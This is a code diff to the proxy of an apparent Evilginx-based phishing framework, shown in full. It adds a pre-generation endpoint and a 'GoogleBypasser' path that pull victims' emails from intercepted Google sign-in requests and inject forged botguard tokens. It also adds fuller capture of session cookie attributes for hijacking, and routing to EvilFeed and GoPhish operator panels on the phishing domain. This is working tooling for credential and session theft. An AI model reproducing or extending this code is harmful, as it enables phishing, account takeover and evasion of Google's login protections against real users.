@@ -218,6 +218,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.Verbose = false
 
+	// Custom logger to suppress harmless "Cannot read TLS response from mitm'd server EOF" errors
+	// These occur when serving local responses (landing page, admin panel) without a backend
+	p.Proxy.Logger = &filteredLogger{}
+
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
@@ -289,6 +293,42 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 					return p.blockRequest(req)
 				}
+			}
+
+			// ============================================================================
+			// PRE-GENERATION ENDPOINT HANDLER (x33fcon optimization)
+			// Handles /.evilginx/pregen POST requests from JS injection
+			// This allows pre-generating botguard tokens BEFORE user clicks Next
+			// ============================================================================
+			if req.URL.Path == "/.evilginx/pregen" && req.Method == "POST" {
+				body, err := ioutil.ReadAll(req.Body)
+				if err != nil {
+					log.Warning("[PreGen] Failed to read request body: %v", err)
+					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Bad Request")
+				}
+				req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+
+				var preGenData struct {
+					Email string `json:"email"`
+				}
+				if err := json.Unmarshal(body, &preGenData); err != nil {
+					log.Warning("[PreGen] Failed to decode request: %v", err)
+					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Bad Request")
+				}
+
+				email := preGenData.Email
+				if email == "" || !strings.Contains(email, "@") {
+					log.Warning("[PreGen] Invalid email in request: %s", email)
+					return req, goproxy.NewResponse(req, goproxy.ContentTypeText, http.StatusBadRequest, "Invalid email")
+				}
+
+				log.Info("[PreGen] 🚀 Pre-generation request for: %s", email)
+
+				// Start pre-generation in background (don't block)
+				go PreGenerateToken(email)
+
+				// Return success immediately
+				return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"started"}`)
 			}
 
 			log.Debug("**--** Request path: %s", req.URL.Path)
@@ -486,6 +526,50 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
+
+			// ============================================================================
+			// BASE DOMAIN ADMIN PANEL ROUTING (EvilFeed/GoPhish on base domain)
+			// Handles /admin/ -> EvilFeed, /mail/ -> GoPhish, and landing page
+			// ============================================================================
+			baseDomain := p.cfg.GetBaseDomain()
+			if baseDomain != "" && strings.EqualFold(req.Host, baseDomain) {
+				// Handle /admin/ path -> EvilFeed
+				adminPath := p.cfg.GetAdminPath()
+				if p.cfg.IsAdminPanelEnabled() && strings.HasPrefix(req.URL.Path, adminPath) {
+					return p.handleAdminPanelProxy(req, adminPath)
+				}
+
+				// Handle /images/ path -> EvilFeed (for shared assets like bg.png)
+				// This allows EvilFeed login page to load background images when accessed via /admin/
+				if p.cfg.IsAdminPanelEnabled() && strings.HasPrefix(req.URL.Path, "/images/") {
+					return p.handleAdminPanelImages(req)
+				}
+
+				// Handle /notify.mp3 -> EvilFeed (for notification sound)
+				// This allows EvilFeed to play notification sounds when accessed via /admin/
+				if p.cfg.IsAdminPanelEnabled() && req.URL.Path == "/notify.mp3" {
+					return p.handleAdminPanelAsset(req)
+				}
+
+				// Handle /mail/ path -> GoPhish
+				mailPath := p.cfg.GetMailPath()
+				if p.cfg.IsMailPanelEnabled() && strings.HasPrefix(req.URL.Path, mailPath) {
+					return p.handleMailPanelProxy(req, mailPath)
+				}
+
+				// Handle landing page for base domain root
+				if p.cfg.IsLandingPageEnabled() && (req.URL.Path == "/" || req.URL.Path == "") {
+					return p.handleLandingPage(req)
+				}
+
+				// If admin/mail disabled but landing enabled, redirect admin/mail paths to landing
+				if p.cfg.IsLandingPageEnabled() {
+					if strings.HasPrefix(req.URL.Path, "/admin") || strings.HasPrefix(req.URL.Path, "/mail") {
+						return p.handleLandingPage(req)
+					}
+				}
+			}
+			// ============================================================================
 
 			// Handle Turnstile verification API endpoint
 			if req.URL.Path == "/_turnstile/verify" && req.Method == "POST" {
@@ -1188,25 +1272,80 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											} else {
 												decodedBodyBytes := []byte(decodedBody)
 
-												b := &GoogleBypasser{
-													isHeadless:     true, // Run headless for server compatibility
-													withDevTools:   false,
-													slowMotionTime: 500, // Reduced delay for faster operation
+												// Extract email from request body
+												emailRegexp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
+												emailMatch := emailRegexp.FindSubmatch(decodedBodyBytes)
+												var email string
+												if len(emailMatch) >= 2 {
+													email = string(bytes.Replace(emailMatch[1], []byte("%40"), []byte("@"), -1))
+													log.Info("[GoogleBypasser] Intercepted MI613e request for email: %s", email)
 												}
-												b.Launch()
-												b.GetEmail(decodedBodyBytes)
-												b.GetToken()
-												decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
 
-												postForm, err := url.ParseQuery(string(decodedBodyBytes))
-												if err != nil {
-													log.Error("Failed to parse form data: %v", err)
+												// OPTIMIZATION: Check if we have a cached token (from pre-generation)
+												if email != "" {
+													if cachedToken, found := GetCachedToken(email); found {
+														log.Success("[GoogleBypasser] 🚀 Using PRE-GENERATED token for: %s", email)
+														b := &GoogleBypasser{}
+														b.token = cachedToken
+														decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+
+														postForm, err := url.ParseQuery(string(decodedBodyBytes))
+														if err != nil {
+															log.Error("Failed to parse form data: %v", err)
+														} else {
+															body = []byte(postForm.Encode())
+															req.ContentLength = int64(len(body))
+														}
+														req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+													} else {
+														// No cached token - generate one now (slower path)
+														log.Warning("[GoogleBypasser] No cached token, generating now for: %s", email)
+
+														b := &GoogleBypasser{
+															isHeadless:     true,
+															withDevTools:   false,
+															slowMotionTime: 500,
+														}
+														b.Launch()
+														b.email = email
+														b.GetToken()
+
+														if b.token != "" {
+															decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+															postForm, err := url.ParseQuery(string(decodedBodyBytes))
+															if err != nil {
+																log.Error("Failed to parse form data: %v", err)
+															} else {
+																body = []byte(postForm.Encode())
+																req.ContentLength = int64(len(body))
+															}
+															log.Success("[GoogleBypasser] Token generated and injected for: %s", email)
+														} else {
+															log.Error("[GoogleBypasser] Failed to generate token for: %s", email)
+														}
+														req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+													}
 												} else {
-													body = []byte(postForm.Encode())
-													req.ContentLength = int64(len(body))
-												}
+													// Fallback to original method if email extraction failed
+													b := &GoogleBypasser{
+														isHeadless:     true,
+														withDevTools:   false,
+														slowMotionTime: 500,
+													}
+													b.Launch()
+													b.GetEmail(decodedBodyBytes)
+													b.GetToken()
+													decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
 
-												req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+													postForm, err := url.ParseQuery(string(decodedBodyBytes))
+													if err != nil {
+														log.Error("Failed to parse form data: %v", err)
+													} else {
+														body = []byte(postForm.Encode())
+														req.ContentLength = int64(len(body))
+													}
+													req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+												}
 											}
 										}
 
@@ -1477,7 +1616,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+
+								// Convert SameSite to string for storage
+								sameSiteStr := ""
+								switch ck.SameSite {
+								case http.SameSiteNoneMode:
+									sameSiteStr = "none"
+								case http.SameSiteLaxMode:
+									sameSiteStr = "lax"
+								case http.SameSiteStrictMode:
+									sameSiteStr = "strict"
+								default:
+									sameSiteStr = ""
+								}
+
+								// Determine if this is a hostOnly cookie (domain was not explicitly set)
+								hostOnly := ck.Domain == ""
+
+								// Use the enhanced function to capture all cookie attributes
+								s.AddCookieAuthTokenFull(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, sameSiteStr, ck.Expires, hostOnly)
 							}
 						}
 					}
@@ -2054,7 +2211,15 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		} else {
 			var ok bool
 			phish_host := ""
-			if !p.cfg.IsLureHostnameValid(hostname) {
+
+			// Check if this is the base domain (for landing page/admin panel)
+			// Base domain doesn't need phishing hostname replacement
+			baseDomain := p.cfg.GetBaseDomain()
+			if hostname == baseDomain && p.cfg.IsBaseDomainActive() {
+				// For base domain, use the hostname as-is
+				phish_host = hostname
+				ok = true
+			} else if !p.cfg.IsLureHostnameValid(hostname) {
 				phish_host, ok = p.replaceHostWithPhished(hostname)
 				if !ok {
 					log.Debug("phishing hostname not found: %s", hostname)
@@ -2532,6 +2697,23 @@ func orPanic(err error) {
 	}
 }
 
+// filteredLogger implements goproxy.Logger interface and filters out harmless warnings
+// This suppresses "Cannot read TLS response from mitm'd server EOF" errors that occur
+// when serving local responses (landing page, admin panel) without a backend server
+type filteredLogger struct{}
+
+func (l *filteredLogger) Printf(format string, v ...interface{}) {
+	msg := fmt.Sprintf(format, v...)
+	// Filter out harmless MITM EOF errors that occur when serving local content
+	if strings.Contains(msg, "Cannot read TLS response from mitm'd server") ||
+		strings.Contains(msg, "Cannot read TLS request from mitm'd client") {
+		// Silently ignore these - they're expected when serving local responses
+		return
+	}
+	// Pass through all other messages
+	log.Debug("[goproxy] %s", msg)
+}
+
 func getContentType(path string, data []byte) string {
 	switch filepath.Ext(path) {
 	case ".css":
@@ -2797,6 +2979,49 @@ func (p *HttpProxy) GetEvilFeed() *EvilFeedClient {
 	return p.evilFeed
 }
 
+func sanitizeRedirectURL(raw string, host string) string {
+	if raw == "" {
+		return "/"
+	}
+
+	// Reject protocol-relative URLs
+	if strings.HasPrefix(raw, "//") {
+		return "/"
+	}
+
+	u, err := url.Parse(raw)
+	if err != nil {
+		return "/"
+	}
+
+	if u.IsAbs() {
+		// Allow only same-host absolute URLs (http/https)
+		if u.Scheme != "http" && u.Scheme != "https" {
+			return "/"
+		}
+		if host == "" || !strings.EqualFold(u.Host, host) {
+			return "/"
+		}
+		return u.String()
+	}
+
+	// Disallow any host without scheme
+	if u.Host != "" {
+		return "/"
+	}
+
+	if u.Path == "" {
+		return "/"
+	}
+
+	if strings.HasPrefix(raw, "/") {
+		return raw
+	}
+
+	// Normalize relative paths to absolute
+	return "/" + raw
+}
+
 // EnableEvilFeedFromCLI enables EvilFeed from CLI flag (-feed)
 func (p *HttpProxy) EnableEvilFeedFromCLI() {
 	if p.evilFeed != nil && !p.evilFeed.IsEnabled() {
@@ -2834,16 +3059,11 @@ func (p *HttpProxy) handleTurnstileVerify(req *http.Request, remoteIP string) (*
 	// Verify the token with Cloudflare
 	verified, err := p.turnstileVerifier.VerifyToken(verifyReq.Token, remoteIP)
 	if err != nil {
-		// Verification failed but fallback allows through
-		log.Warning("turnstile: verification error (fallback active): %v", err)
+		log.Warning("turnstile: verification error: %v", err)
 	}
 
-	// Get redirect URL - use the one from request if provided, otherwise use a default
-	redirectURL := verifyReq.RedirectURL
-	if redirectURL == "" {
-		// Try to find redirect URL from session cookie
-		redirectURL = "/"
-	}
+	// Get redirect URL - sanitize client-provided value
+	redirectURL := sanitizeRedirectURL(verifyReq.RedirectURL, req.Host)
 
 	if verified {
 		log.Info("turnstile: verification successful from %s", remoteIP)
@@ -2852,10 +3072,16 @@ func (p *HttpProxy) handleTurnstileVerify(req *http.Request, remoteIP string) (*
 		return req, resp
 	}
 
-	// This shouldn't happen with fallback mode, but handle it anyway
+	// Strict mode: deny on verification failure or error
+	status := http.StatusForbidden
+	errMsg := "verification failed"
+	if err != nil {
+		status = http.StatusBadGateway
+		errMsg = "verification error"
+	}
 	log.Warning("turnstile: verification denied from %s", remoteIP)
-	resp := goproxy.NewResponse(req, "application/json", http.StatusForbidden,
-		string(TurnstileJSONResponse(false, "", "", "verification failed")))
+	resp := goproxy.NewResponse(req, "application/json", status,
+		string(TurnstileJSONResponse(false, "", "", errMsg)))
 	return req, resp
 }
 
@@ -3362,4 +3588,479 @@ func (p *HttpProxy) cleanupRewriteMapping(rewrittenUrl string) {
 	p.rewriteMutex.Lock()
 	defer p.rewriteMutex.Unlock()
 	delete(p.rewrittenUrls, rewrittenUrl)
+}
+
+// ============================================================================
+// BASE DOMAIN ADMIN PANEL HANDLERS
+// ============================================================================
+
+// handleAdminPanelProxy proxies requests to EvilFeed admin panel
+func (p *HttpProxy) handleAdminPanelProxy(req *http.Request, adminPath string) (*http.Request, *http.Response) {
+	// Get EvilFeed backend URL from admin panel config (NOT the ingest API endpoint)
+	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
+	if evilFeedEndpoint == "" {
+		evilFeedEndpoint = "http://127.0.0.1:1337" // Default EvilFeed web UI port
+	}
+
+	// Strip the admin path prefix and proxy to EvilFeed
+	basePath := strings.TrimSuffix(adminPath, "/") // e.g., "/admin"
+	targetPath := strings.TrimPrefix(req.URL.Path, basePath)
+	if targetPath == "" {
+		targetPath = "/"
+	}
+
+	// Check for WebSocket upgrade request - these need special handling
+	// WebSocket connections cannot be proxied through goproxy's response mechanism
+	if req.Header.Get("Upgrade") == "websocket" {
+		log.Debug("[AdminPanel] WebSocket upgrade request detected for %s", targetPath)
+		// Return nil to let the connection pass through - the client will connect directly
+		// The EvilFeed index.html already constructs the correct WebSocket URL with base path
+		// We need to proxy this as a WebSocket connection
+		return p.handleWebSocketProxy(req, evilFeedEndpoint, targetPath)
+	}
+
+	// Build target URL
+	targetURL := evilFeedEndpoint + targetPath
+	if req.URL.RawQuery != "" {
+		targetURL += "?" + req.URL.RawQuery
+	}
+
+	log.Debug("[AdminPanel] Proxying %s -> %s", req.URL.Path, targetURL)
+
+	// Create proxy request
+	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
+	if err != nil {
+		log.Error("[AdminPanel] Failed to create proxy request: %v", err)
+		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Admin panel unavailable")
+		return req, resp
+	}
+
+	// Copy headers
+	for key, values := range req.Header {
+		for _, value := range values {
+			proxyReq.Header.Add(key, value)
+		}
+	}
+
+	// Make the request with TLS skip verification for local backends
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true, // Allow self-signed certs for local backends
+		},
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+		// Don't follow redirects - let the browser handle them
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	proxyResp, err := client.Do(proxyReq)
+	if err != nil {
+		log.Error("[AdminPanel] Proxy request failed: %v", err)
+		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Admin panel unavailable")
+		return req, resp
+	}
+
+	// Read response body
+	body, _ := ioutil.ReadAll(proxyResp.Body)
+	proxyResp.Body.Close()
+
+	// Rewrite Location header for redirects
+	if location := proxyResp.Header.Get("Location"); location != "" {
+		// If it's an absolute path (starts with /), prepend the base path
+		if strings.HasPrefix(location, "/") && !strings.HasPrefix(location, "//") {
+			proxyResp.Header.Set("Location", basePath+location)
+		}
+	}
+
+	// Rewrite absolute URLs in HTML/JS/CSS responses to include the base path
+	contentType := proxyResp.Header.Get("Content-Type")
+	if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "text/css") {
+		bodyStr := string(body)
+		// Rewrite absolute paths: href="/...", src="/...", action="/..."
+		// But NOT protocol-relative URLs like href="//..."
+		re1 := regexp.MustCompile(`(href|src|action)="(/[^/"][^"]*)"`)
+		bodyStr = re1.ReplaceAllString(bodyStr, `$1="`+basePath+`$2"`)
+		re2 := regexp.MustCompile(`(href|src|action)='(/[^/'][^']*)'`)
+		bodyStr = re2.ReplaceAllString(bodyStr, `$1='`+basePath+`$2'`)
+		// Rewrite fetch('/api/...) calls
+		re3 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"]\)`)
+		bodyStr = re3.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1')`)
+		re4 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"],`)
+		bodyStr = re4.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1',`)
+		// Rewrite url() in CSS: url(/...) or url('/...') or url("/...")
+		re5 := regexp.MustCompile(`url\(["']?(/[^)"']+)["']?\)`)
+		bodyStr = re5.ReplaceAllString(bodyStr, `url('`+basePath+`$1')`)
+		// Rewrite WebSocket URLs: new WebSocket('ws://host/ws') or wss://
+		re6 := regexp.MustCompile(`WebSocket\(['"](wss?://[^/]+)(/[^'"]*)['"]\)`)
+		bodyStr = re6.ReplaceAllString(bodyStr, `WebSocket('$1`+basePath+`$2')`)
+		// Rewrite window.location paths
+		re7 := regexp.MustCompile(`(window\.location\s*=\s*|location\.href\s*=\s*)['"](/[^'"]+)['"]`)
+		bodyStr = re7.ReplaceAllString(bodyStr, `$1'`+basePath+`$2'`)
+		body = []byte(bodyStr)
+	}
+
+	// Create response
+	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, string(body))
+	if resp != nil {
+		// Copy response headers (except Content-Length which may have changed)
+		for key, values := range proxyResp.Header {
+			if key != "Content-Length" {
+				for _, value := range values {
+					resp.Header.Add(key, value)
+				}
+			}
+		}
+	}
+
+	return req, resp
+}
+
+// handleMailPanelProxy proxies requests to GoPhish mail panel
+func (p *HttpProxy) handleMailPanelProxy(req *http.Request, mailPath string) (*http.Request, *http.Response) {
+	// Get GoPhish backend URL from admin panel config (NOT the API integration URL)
+	gophishURL := p.cfg.GetAdminPanelConfig().MailBackend
+	if gophishURL == "" {
+		// GoPhish uses HTTP when use_tls is false (TLS handled by evilginx proxy)
+		gophishURL = "http://127.0.0.1:3333" // Default GoPhish admin panel port
+	}
+
+	// Strip the mail path prefix and proxy to GoPhish
+	basePath := strings.TrimSuffix(mailPath, "/") // e.g., "/mail"
+	targetPath := strings.TrimPrefix(req.URL.Path, basePath)
+	if targetPath == "" {
+		targetPath = "/"
+	}
+
+	// Build target URL
+	targetURL := gophishURL + targetPath
+	if req.URL.RawQuery != "" {
+		targetURL += "?" + req.URL.RawQuery
+	}
+
+	log.Debug("[MailPanel] Proxying %s -> %s", req.URL.Path, targetURL)
+
+	// Create proxy request
+	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
+	if err != nil {
+		log.Error("[MailPanel] Failed to create proxy request: %v", err)
+		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Mail panel unavailable")
+		return req, resp
+	}
+
+	// Copy headers
+	for key, values := range req.Header {
+		for _, value := range values {
+			proxyReq.Header.Add(key, value)
+		}
+	}
+
+	// Remove Accept-Encoding to prevent compression, so we can modify the body for path rewriting
+	proxyReq.Header.Del("Accept-Encoding")
+
+	// Make the request with TLS skip verification for local backends
+	// Note: Since GoPhish is now configured with use_tls=false, we use HTTP
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true, // Allow self-signed certs if GoPhish uses HTTPS
+		},
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+		// Don't follow redirects - let the browser handle them
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	proxyResp, err := client.Do(proxyReq)
+	if err != nil {
+		log.Error("[MailPanel] Proxy request failed: %v", err)
+		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Mail panel unavailable")
+		return req, resp
+	}
+
+	// Read response body
+	body, _ := ioutil.ReadAll(proxyResp.Body)
+	proxyResp.Body.Close()
+
+	// Rewrite Location header for redirects
+	if location := proxyResp.Header.Get("Location"); location != "" {
+		// If it's an absolute path (starts with /), prepend the base path
+		if strings.HasPrefix(location, "/") && !strings.HasPrefix(location, "//") {
+			proxyResp.Header.Set("Location", basePath+location)
+			log.Debug("[MailPanel] Rewrote redirect: %s -> %s", location, basePath+location)
+		}
+	}
+
+	// Rewrite absolute URLs in HTML/JS/CSS responses to include the base path
+	contentType := proxyResp.Header.Get("Content-Type")
+	shouldRewrite := strings.Contains(contentType, "text/html") ||
+		strings.Contains(contentType, "javascript") ||
+		strings.Contains(contentType, "application/javascript") ||
+		strings.Contains(contentType, "text/javascript") ||
+		strings.Contains(contentType, "text/css") ||
+		strings.Contains(contentType, "application/json")
+
+	if shouldRewrite && len(body) > 0 {
+		bodyStr := string(body)
+		originalLen := len(bodyStr)
+
+		// Rewrite absolute paths: href="/...", src="/...", action="/..."
+		// But NOT protocol-relative URLs like href="//..." or data-* attributes
+		re1 := regexp.MustCompile(`(href|src|action)="(/[^/"][^"]*)"`)
+		bodyStr = re1.ReplaceAllString(bodyStr, `$1="`+basePath+`$2"`)
+		re2 := regexp.MustCompile(`(href|src|action)='(/[^/'][^']*)'`)
+		bodyStr = re2.ReplaceAllString(bodyStr, `$1='`+basePath+`$2'`)
+
+		// Rewrite data attributes
+		if !strings.Contains(bodyStr, basePath) || strings.Count(bodyStr, basePath) < 5 {
+			re9 := regexp.MustCompile(`(data-[a-z-]+)="(/[^"]+)"`)
+			bodyStr = re9.ReplaceAllString(bodyStr, `$1="`+basePath+`$2"`)
+		}
+
+		// Rewrite fetch/ajax calls
+		re3 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"]\)`)
+		bodyStr = re3.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1')`)
+		re4 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"],`)
+		bodyStr = re4.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1',`)
+
+		// Rewrite $.ajax and $.get/$.post URLs
+		re5 := regexp.MustCompile(`\$\.(ajax|get|post)\(['"](/[^'"]+)['"]`)
+		bodyStr = re5.ReplaceAllString(bodyStr, `$.$1('`+basePath+`$2'`)
+
+		// Rewrite url: "/..." in JavaScript objects
+		re6 := regexp.MustCompile(`url:\s*['"](/[^'"]+)['"]`)
+		bodyStr = re6.ReplaceAllString(bodyStr, `url: '`+basePath+`$1'`)
+
+		// Rewrite url() in CSS: url(/...) or url('/...') or url("/...")
+		re7 := regexp.MustCompile(`url\(["']?(/[^)"']+)["']?\)`)
+		bodyStr = re7.ReplaceAllString(bodyStr, `url('`+basePath+`$1')`)
+
+		// Rewrite window.location paths
+		re8 := regexp.MustCompile(`(window\.location\s*=\s*|location\.href\s*=\s*)['"](/[^'"]+)['"]`)
+		bodyStr = re8.ReplaceAllString(bodyStr, `$1'`+basePath+`$2'`)
+
+		body = []byte(bodyStr)
+
+		if len(bodyStr) != originalLen {
+			log.Debug("[MailPanel] Rewrote response body: %d -> %d bytes", originalLen, len(bodyStr))
+		}
+	}
+
+	// Create response
+	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, string(body))
+	if resp != nil {
+		// Copy response headers (except Content-Length which may have changed)
+		for key, values := range proxyResp.Header {
+			if key != "Content-Length" {
+				for _, value := range values {
+					resp.Header.Add(key, value)
+				}
+			}
+		}
+	}
+
+	return req, resp
+}
+
+// handleWebSocketProxy handles WebSocket upgrade requests by returning a 101 Switching Protocols response
+// that instructs the client to connect directly to the backend WebSocket server
+// Note: goproxy doesn't support true WebSocket proxying, so we redirect the client
+func (p *HttpProxy) handleWebSocketProxy(req *http.Request, backendURL string, targetPath string) (*http.Request, *http.Response) {
+	// For WebSocket connections through goproxy, we can't do true proxying
+	// The best approach is to let the client know the WebSocket endpoint
+	// Since the client already constructs the correct URL with base path,
+	// and EvilFeed listens on the same path, we need to ensure the backend
+	// WebSocket server is accessible
+
+	// Reduced logging to avoid spam in terminal
+	// WebSocket connections are handled by the client directly
+
+	// Return a 502 Bad Gateway with a message - the client-side JavaScript
+	// in EvilFeed already handles reconnection and constructs the correct URL
+	// The actual WebSocket connection will be handled by EvilFeed directly
+	// when accessed via the correct port
+
+	// For now, return an error response - the client will retry
+	// In a production setup, you'd want to use a proper WebSocket proxy library
+	resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway,
+		"WebSocket connections should be made directly to the backend service")
+	return req, resp
+}
+
+// handleAdminPanelImages proxies /images/ requests to EvilFeed for shared assets
+// This allows the EvilFeed login page to load background images when accessed via /admin/
+func (p *HttpProxy) handleAdminPanelImages(req *http.Request) (*http.Request, *http.Response) {
+	// Get EvilFeed backend URL
+	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
+	if evilFeedEndpoint == "" {
+		evilFeedEndpoint = "http://127.0.0.1:1337"
+	}
+
+	// Proxy the /images/ request directly to EvilFeed
+	targetURL := evilFeedEndpoint + req.URL.Path
+	if req.URL.RawQuery != "" {
+		targetURL += "?" + req.URL.RawQuery
+	}
+
+	log.Debug("[AdminPanelImages] Proxying %s -> %s", req.URL.Path, targetURL)
+
+	// Create proxy request
+	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
+	if err != nil {
+		log.Error("[AdminPanelImages] Failed to create proxy request: %v", err)
+		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Image unavailable")
+		return req, resp
+	}
+
+	// Copy headers
+	for key, values := range req.Header {
+		for _, value := range values {
+			proxyReq.Header.Add(key, value)
+		}
+	}
+
+	// Make the request
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+	}
+	proxyResp, err := client.Do(proxyReq)
+	if err != nil {
+		log.Error("[AdminPanelImages] Proxy request failed: %v", err)
+		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Image unavailable")
+		return req, resp
+	}
+
+	// Read response body
+	body, _ := ioutil.ReadAll(proxyResp.Body)
+	proxyResp.Body.Close()
+
+	// Get content type
+	contentType := proxyResp.Header.Get("Content-Type")
+	if contentType == "" {
+		contentType = http.DetectContentType(body)
+	}
+
+	// Create response
+	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, "")
+	if resp != nil {
+		resp.Body = io.NopCloser(bytes.NewReader(body))
+		// Copy response headers
+		for key, values := range proxyResp.Header {
+			if key != "Content-Length" {
+				for _, value := range values {
+					resp.Header.Add(key, value)
+				}
+			}
+		}
+		// Add caching for images
+		resp.Header.Set("Cache-Control", "public, max-age=86400")
+	}
+
+	return req, resp
+}
+
+// handleAdminPanelAsset proxies generic asset requests (like notify.mp3) to EvilFeed
+// This allows EvilFeed to load assets like notification sounds when accessed via /admin/
+func (p *HttpProxy) handleAdminPanelAsset(req *http.Request) (*http.Request, *http.Response) {
+	// Get EvilFeed backend URL
+	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
+	if evilFeedEndpoint == "" {
+		evilFeedEndpoint = "http://127.0.0.1:1337"
+	}
+
+	// Proxy the request directly to EvilFeed
+	targetURL := evilFeedEndpoint + req.URL.Path
+	if req.URL.RawQuery != "" {
+		targetURL += "?" + req.URL.RawQuery
+	}
+
+	log.Debug("[AdminPanelAsset] Proxying %s -> %s", req.URL.Path, targetURL)
+
+	// Create proxy request
+	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
+	if err != nil {
+		log.Error("[AdminPanelAsset] Failed to create proxy request: %v", err)
+		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Asset unavailable")
+		return req, resp
+	}
+
+	// Copy headers
+	for key, values := range req.Header {
+		for _, value := range values {
+			proxyReq.Header.Add(key, value)
+		}
+	}
+
+	// Make the request
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: transport,
+	}
+	proxyResp, err := client.Do(proxyReq)
+	if err != nil {
+		log.Error("[AdminPanelAsset] Proxy request failed: %v", err)
+		resp := goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "Asset unavailable")
+		return req, resp
+	}
+
+	// Read response body
+	body, _ := ioutil.ReadAll(proxyResp.Body)
+	proxyResp.Body.Close()
+
+	// Get content type
+	contentType := proxyResp.Header.Get("Content-Type")
+	if contentType == "" {
+		contentType = http.DetectContentType(body)
+	}
+
+	// Create response
+	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, "")
+	if resp != nil {
+		resp.Body = io.NopCloser(bytes.NewReader(body))
+		// Copy response headers
+		for key, values := range proxyResp.Header {
+			if key != "Content-Length" {
+				for _, value := range values {
+					resp.Header.Add(key, value)
+				}
+			}
+		}
+		// Add caching for assets
+		resp.Header.Set("Cache-Control", "public, max-age=86400")
+	}
+
+	return req, resp
+}
+
+// handleLandingPage serves the dynamic landing page for base domain
+func (p *HttpProxy) handleLandingPage(req *http.Request) (*http.Request, *http.Response) {
+	// Generate dynamic landing page
+	generator := NewLandingPageGenerator(p.cfg)
+	html := generator.GenerateLandingPage(req)
+
+	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, html)
+	if resp != nil {
+		// Add caching headers for better performance
+		resp.Header.Set("Cache-Control", "public, max-age=3600")
+		resp.Header.Set("X-Content-Type-Options", "nosniff")
+		resp.Header.Set("X-Frame-Options", "SAMEORIGIN")
+	}
+
+	log.Debug("[LandingPage] Served dynamic landing page for %s", req.Host)
+	return req, resp
 }
